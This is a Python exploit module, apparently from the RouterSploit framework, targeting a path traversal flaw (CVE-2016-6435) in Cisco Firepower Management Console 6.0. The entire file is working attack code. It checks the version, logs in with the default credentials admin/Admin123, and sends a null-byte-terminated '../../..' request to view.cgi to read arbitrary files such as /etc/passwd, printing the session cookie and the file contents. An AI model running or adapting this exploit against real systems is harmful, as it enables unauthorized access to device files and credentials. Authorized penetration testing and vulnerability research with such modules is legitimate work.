import requests

from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    print_info,
    mute,
    validators,
    http_request,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Cisco Firepower Management 6.0 Path Traversal vulnerability.
    If the target is vulnerable, it is possible to retrieve content of the arbitrary files.
    """
    __info__ = {
        'name': 'Cisco Firepower Management 6.0 Path Traversal',
        'description': 'Module exploits Cisco Firepower Management 6.0 Path Traversal vulnerability.'
                       'If the target is vulnerable, it is possible to retrieve content of the arbitrary files.',
        'authors': [
            'Matt',  # vulnerability discovery
            'sinn3r',  # Metasploit module
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6435',
            'https://blog.korelogic.com/blog/2016/10/10/virtual_appliance_spelunking',
        ],
        'devices': [
            'Cisco Firepower Management Console 6.0'
        ],
    }

    target = exploits.Option('', 'Target IP address', validators=validators.url)
    port = exploits.Option(443, 'Target Port')

    path = exploits.Option('/etc/passwd', 'File to read through vulnerability')
    username = exploits.Option('admin', 'Default username to log in')
    password = exploits.Option('Admin123', 'Default password to log in')

    session = None

    def run(self):
        self.session = requests.Session()

        if self.check():
            print_success("Target seems to be vulnerable")
            print_status("Trying to authenticate")
            if self.login():
                file_path = "../../..{}".format(self.path)
                url = "{}:{}/events/reports/view.cgi?download=1&files={}%00".format(self.target, self.port, file_path)
                print_status("Requesting: {}".format(file_path))
                response = http_request(method="GET", url=url, session=self.session)

                if response is None:
                    print_error("Exploit failed")
                    return

                print_status("Reading response...")

                if not len(response.text) or "empty or is not available to view" in response.text:
                    print_error("Exploit failed. Empty response.")
                else:
                    print_info(response.text)

            else:
                print_error("Exploit failed. Could not authenticate.")
        else:
            print_error("Exploit failed. Target seems to be not vulnerable.")

    @mute
    def check(self):
        url = "{}:{}/login.cgi?logout=1".format(self.target, self.port)

        response = http_request(method="GET", url=url)

        if response is not None and "6.0.1" in response.content:
            return True  # target is vulnerable

        return False  # target is not vulnerable

    def login(self):
        url = "{}:{}/login.cgi?logout=1".format(self.target, self.port)

        data = {"username": self.username,
                "password": self.password,
                "target": ""}

        response = http_request(method="POST", url=url, data=data, allow_redirects=False, timeout=30, session=self.session)
        if response is None:
            return False

        if response.status_code == 302 and "CGISESSID" in response.cookies.get_dict().keys():
            print_status("CGI Session ID: {}".format(response.cookies.get_dict()['CGISESSID']))
            print_success("Authenticated as {}:{}".format(self.username, self.password))
            return True

        return False
